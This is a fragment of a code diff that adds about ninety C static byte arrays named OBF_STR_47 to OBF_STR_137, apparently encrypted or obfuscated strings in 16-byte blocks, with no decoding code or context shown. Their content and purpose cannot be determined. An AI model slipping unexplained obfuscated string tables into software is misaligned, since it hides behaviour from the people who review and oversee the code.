+static const unsigned char OBF_STR_47[16] = {0x7f, 0x5d, 0xe3, 0x7c, 0xc1, 0x7c, 0x1c, 0x4d, 0xd4, 0x16, 0xaf, 0xc4, 0xdf, 0xee, 0x34, 0xa7};
+static const size_t OBF_STR_47_LEN = 16;
+
+static const unsigned char OBF_STR_48[16] = {0x2a, 0xd9, 0xcf, 0x07, 0x4e, 0x33, 0x9b, 0x35, 0x5d, 0xc4, 0x99, 0x24, 0x3e, 0x0b, 0xff, 0x67};
+static const size_t OBF_STR_48_LEN = 16;
+
+static const unsigned char OBF_STR_49[16] = {0x86, 0xad, 0xb1, 0x26, 0x8d, 0x24, 0xf3, 0x2b, 0x0e, 0x93, 0x0f, 0x78, 0x68, 0x4c, 0x19, 0x4b};
+static const size_t OBF_STR_49_LEN = 16;
+
+static const unsigned char OBF_STR_50[16] = {0xd5, 0xe1, 0xb9, 0xed, 0x9c, 0xc6, 0x14, 0xfb, 0x86, 0x0d, 0x6d, 0xe1, 0x23, 0xd9, 0x7d, 0x48};
+static const size_t OBF_STR_50_LEN = 16;
+
+static const unsigned char OBF_STR_51[16] = {0x1c, 0x38, 0x89, 0xa2, 0x13, 0xbe, 0xdf, 0x07, 0x60, 0x88, 0xdb, 0x36, 0x99, 0x16, 0xdb, 0xbd};
+static const size_t OBF_STR_51_LEN = 16;
+
+static const unsigned char OBF_STR_52[16] = {0x42, 0xe2, 0x52, 0xc2, 0xe5, 0x6a, 0xf4, 0x9b, 0x1f, 0x25, 0x50, 0xcf, 0xda, 0xd9, 0x6a, 0x75};
+static const size_t OBF_STR_52_LEN = 16;
+
+static const unsigned char OBF_STR_53[16] = {0xac, 0x33, 0xc6, 0xa1, 0xc4, 0xcf, 0x5c, 0x02, 0x5a, 0x67, 0x69, 0xb4, 0x07, 0xa2, 0x52, 0xab};
+static const size_t OBF_STR_53_LEN = 16;
+
+static const unsigned char OBF_STR_54[16] = {0x0c, 0x60, 0x41, 0xc2, 0x43, 0xab, 0x7a, 0x56, 0x5c, 0x1e, 0xef, 0xfb, 0x42, 0x08, 0xdc, 0x5f};
+static const size_t OBF_STR_54_LEN = 16;
+
+static const unsigned char OBF_STR_55[16] = {0xf9, 0xdc, 0x91, 0x49, 0x61, 0x79, 0x45, 0x44, 0x16, 0x9a, 0x34, 0x5e, 0x43, 0xc8, 0x90, 0x85};
+static const size_t OBF_STR_55_LEN = 16;
+
+static const unsigned char OBF_STR_56[16] = {0xaf, 0x26, 0x39, 0x75, 0x3f, 0xa6, 0x0e, 0x34, 0x78, 0xbb, 0x52, 0x09, 0xdf, 0x86, 0x79, 0x0a};
+static const size_t OBF_STR_56_LEN = 16;
+
+static const unsigned char OBF_STR_57[16] = {0x3c, 0x67, 0xc9, 0x37, 0xb7, 0x31, 0x4e, 0x12, 0x3a, 0x7c, 0xbb, 0xd6, 0x28, 0xf9, 0xd3, 0x20};
+static const size_t OBF_STR_57_LEN = 16;
+
+static const unsigned char OBF_STR_58[16] = {0xe9, 0x14, 0x86, 0x1e, 0x3b, 0xde, 0x22, 0xed, 0x32, 0xf7, 0x5e, 0xda, 0x96, 0xf2, 0x2d, 0x51};
+static const size_t OBF_STR_58_LEN = 16;
+
+static const unsigned char OBF_STR_59[16] = {0x1d, 0x85, 0x62, 0x26, 0x35, 0xb4, 0xf4, 0xc3, 0xfd, 0x5e, 0x7e, 0x41, 0xcf, 0x3e, 0xa3, 0x64};
+static const size_t OBF_STR_59_LEN = 16;
+
+static const unsigned char OBF_STR_60[16] = {0x3b, 0x03, 0x46, 0xb6, 0xe4, 0x9e, 0x70, 0x5b, 0x6d, 0x28, 0x71, 0x08, 0x77, 0xd3, 0xd8, 0x54};
+static const size_t OBF_STR_60_LEN = 16;
+
+static const unsigned char OBF_STR_61[16] = {0xfe, 0xaf, 0x23, 0xfd, 0x6f, 0x7c, 0xd8, 0xd3, 0x6a, 0xdd, 0xc5, 0xbf, 0x90, 0x62, 0x68, 0x1c};
+static const size_t OBF_STR_61_LEN = 16;
+
+static const unsigned char OBF_STR_62[16] = {0x6a, 0xe6, 0x29, 0xf3, 0x3f, 0xc4, 0xf5, 0x1c, 0xf3, 0x44, 0xb5, 0x54, 0x96, 0xb9, 0x46, 0xb8};
+static const size_t OBF_STR_62_LEN = 16;
+
+static const unsigned char OBF_STR_63[16] = {0xb8, 0x19, 0x7b, 0xaf, 0x25, 0x26, 0xfb, 0x74, 0x09, 0x81, 0x2c, 0x46, 0x41, 0xa0, 0x66, 0x9a};
+static const size_t OBF_STR_63_LEN = 16;
+
+static const unsigned char OBF_STR_64[16] = {0x84, 0x8e, 0x07, 0xec, 0x11, 0x93, 0x8d, 0xe4, 0xd0, 0xa3, 0x46, 0x24, 0xb9, 0xbc, 0xd3, 0x72};
+static const size_t OBF_STR_64_LEN = 16;
+
+static const unsigned char OBF_STR_65[64] = {0x5b, 0x79, 0x0a, 0xe1, 0x25, 0x41, 0x3c, 0x6e, 0x88, 0x34, 0xe8, 0xfa, 0x63, 0xde, 0x4a, 0xb4, 0x97, 0x80, 0x1f, 0xf6, 0xe9, 0x49, 0x9c, 0x11, 0x1f, 0xe7, 0xa0, 0x6f, 0xe7, 0xb2, 0xd5, 0xbf, 0xb8, 0xd8, 0x0b, 0x75, 0x4d, 0x54, 0xd4, 0xaa, 0x85, 0x8e, 0x4b, 0xa5, 0x4a, 0xdc, 0xfa, 0x99, 0x4e, 0xbd, 0x19, 0xd9, 0x5c, 0x29, 0xa4, 0x49, 0x94, 0xa9, 0xe4, 0xb9, 0x60, 0x53, 0xab, 0x9a};
+static const size_t OBF_STR_65_LEN = 64;
+
+static const unsigned char OBF_STR_66[16] = {0x9e, 0xe1, 0xd2, 0x0c, 0x53, 0xd0, 0x85, 0xf2, 0xb2, 0x68, 0xf8, 0x93, 0x6c, 0xaf, 0xa5, 0x4f};
+static const size_t OBF_STR_66_LEN = 16;
+
+static const unsigned char OBF_STR_67[48] = {0xde, 0xf0, 0x86, 0x67, 0x40, 0x0a, 0xbb, 0x75, 0x1c, 0x67, 0x57, 0x68, 0xff, 0x34, 0xab, 0x09, 0x5e, 0x22, 0x87, 0xf8, 0x9e, 0x8e, 0x32, 0x75, 0x67, 0xc8, 0x9e, 0xe3, 0xa8, 0x7c, 0xc8, 0x2c, 0x28, 0xcf, 0x3e, 0xa3, 0x2d, 0x36, 0x80, 0x23, 0x7c, 0xe5, 0xce, 0x1a, 0x67, 0x6d, 0xc9, 0x87};
+static const size_t OBF_STR_67_LEN = 48;
+
+static const unsigned char OBF_STR_68[80] = {0xde, 0xf0, 0x86, 0x67, 0x40, 0x0a, 0xbb, 0x75, 0x1c, 0x67, 0x57, 0x68, 0xff, 0x34, 0xab, 0x09, 0x5e, 0x22, 0x87, 0xf8, 0x9e, 0x8e, 0x32, 0x75, 0x67, 0xc8, 0x9e, 0xe3, 0xa8, 0x7c, 0xc8, 0x2c, 0xfd, 0x7a, 0x53, 0x5b, 0x03, 0xce, 0xf8, 0xd1, 0xa5, 0x9b, 0xac, 0x0c, 0x41, 0x4c, 0x28, 0xf5, 0x57, 0x17, 0x3f, 0x1b, 0x94, 0x66, 0xd5, 0xe5, 0xdb, 0x83, 0x49, 0xd0, 0xd0, 0x9d, 0x80, 0x5c, 0x6b, 0xc8, 0x6f, 0x14, 0xc0, 0x98, 0xf7, 0x7b, 0xc3, 0x0b, 0x94, 0x0d, 0x2b, 0x05, 0x1f, 0xce};
+static const size_t OBF_STR_68_LEN = 80;
+
+static const unsigned char OBF_STR_69[16] = {0xca, 0x62, 0xfe, 0x84, 0x02, 0x47, 0x48, 0x3b, 0xd1, 0xf0, 0xc1, 0xa2, 0x67, 0xc9, 0x78, 0x22};
+static const size_t OBF_STR_69_LEN = 16;
+
+static const unsigned char OBF_STR_70[32] = {0xa0, 0x4d, 0xbb, 0xcd, 0xd6, 0x34, 0xe8, 0x33, 0xe0, 0xea, 0x0d, 0x00, 0x1d, 0xbf, 0x26, 0xad, 0x97, 0x67, 0x7f, 0x17, 0x72, 0x13, 0xbc, 0x70, 0x83, 0xba, 0x9f, 0x59, 0xbf, 0xca, 0xd8, 0xdb};
+static const size_t OBF_STR_70_LEN = 32;
+
+static const unsigned char OBF_STR_71[48] = {0xaa, 0xc8, 0x9e, 0x1b, 0xce, 0xfa, 0x88, 0x0c, 0x45, 0x97, 0x5f, 0x70, 0x6e, 0xe7, 0xbb, 0xa9, 0x3d, 0x5a, 0xdb, 0x04, 0xa5, 0xb4, 0xd3, 0xfd, 0x8c, 0x1c, 0x27, 0xc1, 0x4f, 0xb6, 0x4e, 0xb6, 0x16, 0x1b, 0x94, 0xc4, 0x88, 0xc5, 0xa2, 0x53, 0x02, 0x18, 0xfe, 0xfc, 0xa9, 0xe4, 0x29, 0xe9};
+static const size_t OBF_STR_71_LEN = 48;
+
+static const unsigned char OBF_STR_72[16] = {0x8f, 0x5f, 0x06, 0x71, 0x43, 0xb1, 0x83, 0xe4, 0xa6, 0x13, 0x5a, 0x15, 0x13, 0x8a, 0xc7, 0xd6};
+static const size_t OBF_STR_72_LEN = 16;
+
+static const unsigned char OBF_STR_73[32] = {0x0b, 0x32, 0xce, 0xee, 0x8a, 0x49, 0xe9, 0xac, 0x72, 0x13, 0x91, 0x31, 0x38, 0xb7, 0x64, 0x5e, 0x68, 0x4d, 0x98, 0x13, 0xff, 0x40, 0x5d, 0x47, 0x8d, 0x2c, 0x95, 0x4c, 0xcf, 0x57, 0x55, 0xb1};
+static const size_t OBF_STR_73_LEN = 32;
+
+static const unsigned char OBF_STR_74[32] = {0x11, 0x13, 0xf7, 0xca, 0x3c, 0x58, 0x6e, 0x53, 0xfb, 0x65, 0x47, 0xc6, 0x71, 0x9f, 0xa1, 0x04, 0xc1, 0x63, 0xdf, 0x44, 0xc9, 0x6c, 0xba, 0xd0, 0xf6, 0xaf, 0x96, 0x2f, 0x98, 0xbf, 0x78, 0x93};
+static const size_t OBF_STR_74_LEN = 32;
+
+static const unsigned char OBF_STR_75[32] = {0xa6, 0x13, 0x0d, 0x77, 0xa0, 0x96, 0xf0, 0xf0, 0x78, 0x90, 0x11, 0x31, 0x0c, 0xab, 0xb1, 0x02, 0x82, 0x44, 0xd6, 0x9c, 0x42, 0xae, 0x1d, 0x23, 0xa1, 0x49, 0xf8, 0x30, 0x82, 0xf8, 0x76, 0xf2};
+static const size_t OBF_STR_75_LEN = 32;
+
+static const unsigned char OBF_STR_76[16] = {0xb1, 0xd1, 0x1b, 0x52, 0xc3, 0xae, 0x8f, 0xda, 0xfb, 0xbe, 0x3d, 0xfd, 0xfb, 0x68, 0xf4, 0xa2};
+static const size_t OBF_STR_76_LEN = 16;
+
+static const unsigned char OBF_STR_77[16] = {0x59, 0x8d, 0x23, 0xd3, 0x00, 0x1c, 0x17, 0x3b, 0x0f, 0x2b, 0x69, 0x75, 0xb0, 0x06, 0xb8, 0x12};
+static const size_t OBF_STR_77_LEN = 16;
+
+static const unsigned char OBF_STR_78[16] = {0x0d, 0x07, 0xb0, 0x13, 0x4b, 0x1c, 0x6c, 0x9c, 0x27, 0x82, 0x9a, 0x0b, 0x30, 0xef, 0xe5, 0x07};
+static const size_t OBF_STR_78_LEN = 16;
+
+static const unsigned char OBF_STR_79[16] = {0x84, 0x8b, 0x93, 0x84, 0xc6, 0x1d, 0xf5, 0x9d, 0x46, 0x27, 0x69, 0xc6, 0xad, 0x67, 0x31, 0x63};
+static const size_t OBF_STR_79_LEN = 16;
+
+static const unsigned char OBF_STR_80[16] = {0x7c, 0xf5, 0x4e, 0x08, 0xad, 0xe4, 0x5f, 0x3b, 0xe0, 0x6f, 0x87, 0xa8, 0xa2, 0x63, 0xfe, 0x76};
+static const size_t OBF_STR_80_LEN = 16;
+
+static const unsigned char OBF_STR_81[16] = {0x9d, 0x3b, 0x47, 0xf7, 0x64, 0xd8, 0x58, 0xcf, 0x35, 0xd5, 0x1b, 0x3b, 0xc0, 0xc6, 0x8c, 0xe5};
+static const size_t OBF_STR_81_LEN = 16;
+
+static const unsigned char OBF_STR_82[16] = {0x7e, 0x01, 0xe8, 0xd4, 0xf3, 0xe6, 0x06, 0x9d, 0xb6, 0x02, 0xcf, 0xee, 0x24, 0x75, 0xb2, 0xfe};
+static const size_t OBF_STR_82_LEN = 16;
+
+static const unsigned char OBF_STR_83[16] = {0xcb, 0x2a, 0xdf, 0x53, 0xd0, 0x94, 0xa3, 0xa7, 0x0c, 0x82, 0xfb, 0x88, 0xe8, 0x2d, 0x23, 0xa2};
+static const size_t OBF_STR_83_LEN = 16;
+
+static const unsigned char OBF_STR_84[16] = {0x00, 0x1e, 0xdc, 0x44, 0xc4, 0xc7, 0xbc, 0xd4, 0x98, 0x11, 0x24, 0x6c, 0x2c, 0x6d, 0x02, 0xf0};
+static const size_t OBF_STR_84_LEN = 16;
+
+static const unsigned char OBF_STR_85[16] = {0x1b, 0x10, 0xef, 0xde, 0x4e, 0xcd, 0xff, 0xf4, 0x3a, 0xd5, 0xb5, 0x50, 0xf8, 0x4f, 0x10, 0xbd};
+static const size_t OBF_STR_85_LEN = 16;
+
+static const unsigned char OBF_STR_86[32] = {0xd2, 0x92, 0x9b, 0xde, 0x18, 0x5c, 0x70, 0x9a, 0x71, 0x80, 0xfd, 0x73, 0xfd, 0x26, 0x66, 0xe0, 0x13, 0xbd, 0x62, 0x2d, 0x48, 0x36, 0xc0, 0xc3, 0x3c, 0x65, 0x3a, 0x2b, 0x5d, 0xb1, 0x7d, 0x1d};
+static const size_t OBF_STR_86_LEN = 32;
+
+static const unsigned char OBF_STR_87[16] = {0xba, 0x91, 0x1c, 0x84, 0x34, 0xae, 0x3b, 0x38, 0x12, 0x6e, 0x37, 0xbb, 0xfd, 0xdd, 0xa6, 0x43};
+static const size_t OBF_STR_87_LEN = 16;
+
+static const unsigned char OBF_STR_88[16] = {0x76, 0x05, 0x89, 0xee, 0xcc, 0xcf, 0x1f, 0xb6, 0x7e, 0x28, 0x1f, 0x07, 0xf3, 0xc9, 0x05, 0xe1};
+static const size_t OBF_STR_88_LEN = 16;
+
+static const unsigned char OBF_STR_89[16] = {0xbc, 0x69, 0x2f, 0x18, 0xb3, 0x4a, 0x96, 0xbe, 0xf2, 0xfc, 0xfd, 0x1e, 0x32, 0xd1, 0x8a, 0x28};
+static const size_t OBF_STR_89_LEN = 16;
+
+static const unsigned char OBF_STR_90[16] = {0xcd, 0x06, 0xdb, 0x1c, 0xce, 0x51, 0x1d, 0xb6, 0x99, 0xe8, 0x76, 0xfb, 0x56, 0xc2, 0x1d, 0x3e};
+static const size_t OBF_STR_90_LEN = 16;
+
+static const unsigned char OBF_STR_91[16] = {0x6b, 0xf1, 0x95, 0x7a, 0x9d, 0x61, 0xa4, 0x82, 0xbb, 0x90, 0xbd, 0xee, 0xc1, 0x4c, 0x52, 0x20};
+static const size_t OBF_STR_91_LEN = 16;
+
+static const unsigned char OBF_STR_92[16] = {0x29, 0xe7, 0xc3, 0x24, 0x7d, 0x6a, 0xf8, 0x80, 0x80, 0x20, 0xa6, 0x11, 0xda, 0x67, 0xc2, 0x85};
+static const size_t OBF_STR_92_LEN = 16;
+
+static const unsigned char OBF_STR_93[16] = {0x10, 0xc2, 0xf6, 0x77, 0x09, 0xab, 0xdb, 0x42, 0x9b, 0x4c, 0xa8, 0x9c, 0xa1, 0xec, 0xd9, 0x0a};
+static const size_t OBF_STR_93_LEN = 16;
+
+static const unsigned char OBF_STR_94[16] = {0xa0, 0xc7, 0xf4, 0xb4, 0x53, 0x5f, 0xf7, 0x76, 0x6a, 0x56, 0x52, 0x70, 0xd4, 0xfd, 0x74, 0xe6};
+static const size_t OBF_STR_94_LEN = 16;
+
+static const unsigned char OBF_STR_95[16] = {0xbf, 0x0d, 0xa9, 0x00, 0x24, 0x4d, 0xc7, 0xb1, 0xc5, 0x6f, 0x99, 0x34, 0xf9, 0x93, 0x5a, 0x0b};
+static const size_t OBF_STR_95_LEN = 16;
+
+static const unsigned char OBF_STR_96[16] = {0x89, 0xef, 0x68, 0xbf, 0x25, 0x19, 0x1d, 0xc4, 0xbb, 0xdc, 0xef, 0xe5, 0x33, 0xc5, 0x75, 0xbb};
+static const size_t OBF_STR_96_LEN = 16;
+
+static const unsigned char OBF_STR_97[16] = {0x93, 0xf0, 0x6d, 0x2f, 0xde, 0xd0, 0x18, 0x0e, 0xed, 0x37, 0x03, 0x80, 0xf8, 0xe9, 0x39, 0xdd};
+static const size_t OBF_STR_97_LEN = 16;
+
+static const unsigned char OBF_STR_98[16] = {0x11, 0xd2, 0x17, 0x08, 0xa9, 0x56, 0x20, 0x22, 0xab, 0xbd, 0xd2, 0xcf, 0x63, 0xfb, 0x8c, 0x61};
+static const size_t OBF_STR_98_LEN = 16;
+
+static const unsigned char OBF_STR_99[16] = {0x47, 0x38, 0x5a, 0xe2, 0x12, 0x03, 0x0c, 0x05, 0x1e, 0x6b, 0xa2, 0xe2, 0xf4, 0x0e, 0x05, 0x0f};
+static const size_t OBF_STR_99_LEN = 16;
+
+static const unsigned char OBF_STR_100[16] = {0xc0, 0xc4, 0x70, 0x63, 0x34, 0x9c, 0x1d, 0x4c, 0x32, 0xde, 0xe9, 0x85, 0xb1, 0xdf, 0x74, 0xaf};
+static const size_t OBF_STR_100_LEN = 16;
+
+static const unsigned char OBF_STR_101[16] = {0xdd, 0xb5, 0x0d, 0x66, 0x3f, 0xf7, 0xa5, 0xbd, 0x5f, 0xf0, 0xdc, 0x12, 0x68, 0x95, 0xff, 0x19};
+static const size_t OBF_STR_101_LEN = 16;
+
+static const unsigned char OBF_STR_102[16] = {0x62, 0x76, 0x2c, 0xad, 0x25, 0x0f, 0xbe, 0x26, 0x03, 0x0b, 0xf5, 0xcc, 0x8f, 0x05, 0xb1, 0xee};
+static const size_t OBF_STR_102_LEN = 16;
+
+static const unsigned char OBF_STR_103[16] = {0xac, 0x5d, 0x3a, 0x1a, 0xb1, 0xfc, 0xc5, 0xdb, 0xe9, 0xb5, 0x99, 0xcb, 0xf0, 0x55, 0x76, 0x19};
+static const size_t OBF_STR_103_LEN = 16;
+
+static const unsigned char OBF_STR_104[16] = {0x05, 0x99, 0x9f, 0xd6, 0x02, 0x6d, 0x24, 0xaa, 0x78, 0xf9, 0x9e, 0xea, 0x1b, 0x94, 0xfe, 0x85};
+static const size_t OBF_STR_104_LEN = 16;
+
+static const unsigned char OBF_STR_105[16] = {0x03, 0x70, 0x1c, 0xa8, 0x1b, 0x4f, 0x5d, 0x48, 0xcd, 0xf1, 0x0e, 0xf1, 0xd8, 0x04, 0xef, 0xec};
+static const size_t OBF_STR_105_LEN = 16;
+
+static const unsigned char OBF_STR_106[16] = {0x61, 0x8d, 0x41, 0xff, 0x5c, 0x9a, 0x9a, 0x0b, 0xc8, 0xc4, 0x36, 0x23, 0xc0, 0x11, 0x82, 0xa1};
+static const size_t OBF_STR_106_LEN = 16;
+
+static const unsigned char OBF_STR_107[16] = {0x9a, 0x31, 0x62, 0x48, 0x51, 0xe0, 0x26, 0x59, 0xd8, 0xcd, 0x5a, 0x38, 0xcf, 0x28, 0xd0, 0xf7};
+static const size_t OBF_STR_107_LEN = 16;
+
+static const unsigned char OBF_STR_108[64] = {0x42, 0xa3, 0x0e, 0x4d, 0x1c, 0xd8, 0x42, 0x23, 0x19, 0xc2, 0xe4, 0x70, 0xdb, 0xd7, 0xc0, 0xdd, 0xc9, 0x76, 0xde, 0xbe, 0x12, 0x2a, 0x9a, 0xa9, 0xa0, 0x0e, 0x39, 0x1e, 0x3f, 0x95, 0xe9, 0x40, 0x2d, 0xfa, 0xe0, 0xcc, 0x02, 0xd4, 0x61, 0x95, 0x44, 0x19, 0x0d, 0xdc, 0x75, 0x98, 0x4c, 0xde, 0x19, 0xeb, 0x6a, 0xa7, 0x8c, 0x34, 0x65, 0x3c, 0x32, 0x1e, 0xd5, 0x58, 0xd5, 0x7e, 0xbe, 0x8c};
+static const size_t OBF_STR_108_LEN = 64;
+
+static const unsigned char OBF_STR_109[64] = {0xcc, 0x44, 0x18, 0x0f, 0x1c, 0x4e, 0xdd, 0x8c, 0xc0, 0xaa, 0x7e, 0xdc, 0xdb, 0xad, 0x4d, 0x61, 0x8b, 0x6f, 0xfe, 0x57, 0xbc, 0x0c, 0x0b, 0xdb, 0xb1, 0xef, 0xf4, 0x76, 0x09, 0x5e, 0xef, 0xb2, 0x93, 0x8b, 0xc3, 0x1b, 0xa5, 0xb7, 0x0c, 0x96, 0x10, 0x53, 0x2c, 0xb2, 0x2d, 0xfb, 0x14, 0xc0, 0x76, 0x50, 0x38, 0x33, 0x40, 0xfe, 0xc3, 0xba, 0x5b, 0xc8, 0x41, 0x3d, 0xe2, 0x2a, 0x8d, 0xed};
+static const size_t OBF_STR_109_LEN = 64;
+
+static const unsigned char OBF_STR_110[16] = {0x8e, 0x8a, 0x13, 0xf9, 0x41, 0xf5, 0xe3, 0xe1, 0xef, 0x62, 0x55, 0x76, 0xd2, 0xe8, 0x83, 0xdc};
+static const size_t OBF_STR_110_LEN = 16;
+
+static const unsigned char OBF_STR_111[32] = {0x37, 0x0d, 0x55, 0xc5, 0x0d, 0x46, 0xca, 0xf2, 0x0a, 0x4f, 0xf1, 0x62, 0x6d, 0xe1, 0xbf, 0xb0, 0x3f, 0x51, 0x03, 0x2b, 0x34, 0x52, 0xbc, 0x83, 0x02, 0x44, 0x8c, 0x78, 0xd4, 0xb8, 0xcf, 0xaf};
+static const size_t OBF_STR_111_LEN = 32;
+
+static const unsigned char OBF_STR_112[16] = {0xbe, 0xf2, 0xbe, 0x7c, 0x70, 0x9d, 0x46, 0x76, 0x09, 0x7e, 0x67, 0xd0, 0x93, 0x1e, 0x55, 0xf8};
+static const size_t OBF_STR_112_LEN = 16;
+
+static const unsigned char OBF_STR_113[16] = {0x22, 0x31, 0xfc, 0x62, 0x2f, 0x46, 0xdc, 0x4a, 0x8e, 0xaa, 0x8e, 0x15, 0xbd, 0xc9, 0x8d, 0xb1};
+static const size_t OBF_STR_113_LEN = 16;
+
+static const unsigned char OBF_STR_114[16] = {0x69, 0xae, 0x1f, 0x7e, 0x11, 0xf1, 0x3c, 0x7b, 0x58, 0x4c, 0xa9, 0xa1, 0x4c, 0x05, 0x76, 0x89};
+static const size_t OBF_STR_114_LEN = 16;
+
+static const unsigned char OBF_STR_115[16] = {0xaa, 0xaa, 0x4b, 0x4b, 0x62, 0xac, 0xe9, 0xd9, 0x38, 0x25, 0x83, 0xe1, 0x96, 0x67, 0x0a, 0xa6};
+static const size_t OBF_STR_115_LEN = 16;
+
+static const unsigned char OBF_STR_116[16] = {0x06, 0x88, 0x48, 0x34, 0x84, 0xeb, 0xf3, 0x7c, 0x2e, 0xb5, 0xbf, 0xd7, 0xed, 0x2d, 0x5a, 0xdb};
+static const size_t OBF_STR_116_LEN = 16;
+
+static const unsigned char OBF_STR_117[16] = {0x0f, 0x27, 0x91, 0x73, 0x37, 0x4e, 0xc9, 0x75, 0xec, 0x80, 0x60, 0xeb, 0xdc, 0xbf, 0x76, 0xae};
+static const size_t OBF_STR_117_LEN = 16;
+
+static const unsigned char OBF_STR_118[16] = {0xa8, 0xb6, 0x1d, 0xbc, 0xae, 0x57, 0x16, 0x89, 0xd0, 0x69, 0x25, 0x84, 0x02, 0x8b, 0xce, 0x51};
+static const size_t OBF_STR_118_LEN = 16;
+
+static const unsigned char OBF_STR_119[16] = {0xc5, 0xa7, 0x61, 0x37, 0xab, 0xb4, 0x47, 0xc7, 0xa1, 0xef, 0xa8, 0x94, 0x31, 0xb2, 0x0e, 0x4d};
+static const size_t OBF_STR_119_LEN = 16;
+
+static const unsigned char OBF_STR_120[16] = {0xaf, 0xf9, 0x6d, 0x6f, 0x45, 0xe3, 0xe2, 0x22, 0xa0, 0x8f, 0x8f, 0x2e, 0xe1, 0x7b, 0x72, 0x12};
+static const size_t OBF_STR_120_LEN = 16;
+
+static const unsigned char OBF_STR_121[16] = {0x29, 0xe7, 0xc3, 0x24, 0x7d, 0x6a, 0xf8, 0x80, 0x80, 0x20, 0xa6, 0x11, 0xda, 0x67, 0xc2, 0x85};
+static const size_t OBF_STR_121_LEN = 16;
+
+static const unsigned char OBF_STR_122[16] = {0x15, 0x69, 0xb6, 0x7d, 0x68, 0x56, 0x70, 0x39, 0x1e, 0x36, 0xe2, 0xb5, 0xde, 0x81, 0xad, 0x8d};
+static const size_t OBF_STR_122_LEN = 16;
+
+static const unsigned char OBF_STR_123[32] = {0xfa, 0x4f, 0xc2, 0x4a, 0xae, 0xe8, 0x5e, 0xb7, 0x3b, 0xec, 0x86, 0x1c, 0xb4, 0x3f, 0x96, 0x92, 0xe8, 0x2f, 0x6b, 0xb8, 0xb1, 0x4f, 0xb0, 0x9c, 0x50, 0xd9, 0xcb, 0x07, 0xd0, 0xd9, 0x69, 0x39};
+static const size_t OBF_STR_123_LEN = 32;
+
+static const unsigned char OBF_STR_124[32] = {0x94, 0x24, 0x92, 0x17, 0x54, 0x7d, 0xd7, 0xd1, 0xe9, 0xd2, 0x04, 0x68, 0x4f, 0xba, 0x1a, 0x8a, 0xc7, 0x8e, 0x01, 0xb4, 0x03, 0xeb, 0xe0, 0x86, 0x5c, 0xfa, 0xa0, 0x82, 0x08, 0xf2, 0xaf, 0x4b};
+static const size_t OBF_STR_124_LEN = 32;
+
+static const unsigned char OBF_STR_125[32] = {0xff, 0xac, 0x47, 0xc9, 0x03, 0x10, 0x2d, 0x5d, 0x04, 0x24, 0x0d, 0x16, 0x97, 0x56, 0x96, 0x12, 0xab, 0x45, 0x06, 0x63, 0xa8, 0x66, 0x30, 0x87, 0x7d, 0x0d, 0x6b, 0x04, 0x35, 0x16, 0xd7, 0x63};
+static const size_t OBF_STR_125_LEN = 32;
+
+static const unsigned char OBF_STR_126[32] = {0xd8, 0xc9, 0x2b, 0x12, 0x62, 0xa3, 0xae, 0xaa, 0x48, 0x9e, 0xd0, 0x39, 0xe7, 0x64, 0xe1, 0xa6, 0x76, 0x43, 0xb0, 0xb5, 0xd6, 0xdf, 0x5a, 0x3f, 0xfc, 0x67, 0xc0, 0xe6, 0xca, 0xe4, 0xa7, 0x01};
+static const size_t OBF_STR_126_LEN = 32;
+
+static const unsigned char OBF_STR_127[32] = {0xbe, 0xc0, 0x51, 0xa1, 0xe5, 0x1b, 0xca, 0x45, 0x48, 0xac, 0x4c, 0x58, 0x75, 0x0a, 0x53, 0x75, 0xf5, 0xe6, 0x5c, 0x5f, 0xe1, 0x35, 0x47, 0xce, 0xc9, 0xfc, 0x60, 0xbe, 0xcb, 0x44, 0x04, 0x1b};
+static const size_t OBF_STR_127_LEN = 32;
+
+static const unsigned char OBF_STR_128[16] = {0xc9, 0xf8, 0xde, 0xb2, 0x29, 0xac, 0xaa, 0xe8, 0xa7, 0x06, 0x02, 0x0f, 0xe6, 0x71, 0xaa, 0x5f};
+static const size_t OBF_STR_128_LEN = 16;
+
+static const unsigned char OBF_STR_129[16] = {0xca, 0x7f, 0xf5, 0xbf, 0x0e, 0xa5, 0x84, 0x79, 0x0e, 0x08, 0xd2, 0xf1, 0x05, 0xf1, 0x04, 0xaf};
+static const size_t OBF_STR_129_LEN = 16;
+
+static const unsigned char OBF_STR_130[16] = {0xbd, 0x4a, 0x6e, 0x14, 0xb4, 0x1d, 0xfe, 0x51, 0x52, 0x78, 0xf7, 0x88, 0x45, 0x5e, 0xf2, 0xf7};
+static const size_t OBF_STR_130_LEN = 16;
+
+static const unsigned char OBF_STR_131[16] = {0x0a, 0x82, 0x77, 0x20, 0x45, 0x81, 0xaa, 0x4d, 0xc0, 0x1b, 0x4b, 0xfb, 0x50, 0xbc, 0x69, 0xd6};
+static const size_t OBF_STR_131_LEN = 16;
+
+static const unsigned char OBF_STR_132[16] = {0x65, 0x22, 0x7b, 0x1d, 0x1b, 0x1c, 0xde, 0xe8, 0x09, 0xa7, 0x91, 0x9c, 0xae, 0x4f, 0xaf, 0xc3};
+static const size_t OBF_STR_132_LEN = 16;
+
+static const unsigned char OBF_STR_133[32] = {0x0a, 0x58, 0x64, 0x37, 0xea, 0xd4, 0x9d, 0x3f, 0x9c, 0xb7, 0x15, 0x63, 0x8a, 0x46, 0x7e, 0x65, 0x57, 0x70, 0xe0, 0x69, 0x0d, 0x1e, 0x6e, 0xb7, 0xf0, 0x67, 0x6d, 0x4e, 0xc0, 0xf1, 0x79, 0x35};
+static const size_t OBF_STR_133_LEN = 32;
+
+static const unsigned char OBF_STR_134[16] = {0x8e, 0xe1, 0x59, 0x97, 0xbc, 0xb1, 0x05, 0xe8, 0x09, 0x29, 0xe9, 0xd0, 0xf5, 0xd7, 0x6d, 0xfd};
+static const size_t OBF_STR_134_LEN = 16;
+
+static const unsigned char OBF_STR_135[16] = {0xbb, 0x16, 0x47, 0x59, 0xc4, 0x31, 0x5f, 0xfe, 0x11, 0x22, 0x1a, 0xfe, 0xfb, 0x52, 0xb3, 0xc2};
+static const size_t OBF_STR_135_LEN = 16;
+
+static const unsigned char OBF_STR_136[32] = {0xa4, 0x8f, 0x41, 0x84, 0x9d, 0xad, 0xcf, 0x0e, 0xb8, 0x4d, 0x48, 0x70, 0x9e, 0xaf, 0x79, 0xed, 0xb5, 0x80, 0x88, 0xbb, 0x0a, 0x7d, 0x3c, 0xda, 0x1d, 0x49, 0xb7, 0x62, 0x1c, 0x81, 0xa6, 0x19};
+static const size_t OBF_STR_136_LEN = 32;
+
+static const unsigned char OBF_STR_137[16] = {0xc1, 0x18, 0x05, 0x36, 0x3b, 0x68, 0xf8, 0xa6, 0xd5, 0x00, 0x92, 0x61, 0x36, 0xe4, 0x79, 0xa1};
+static const size_t OBF_STR_137_LEN = 16;
+
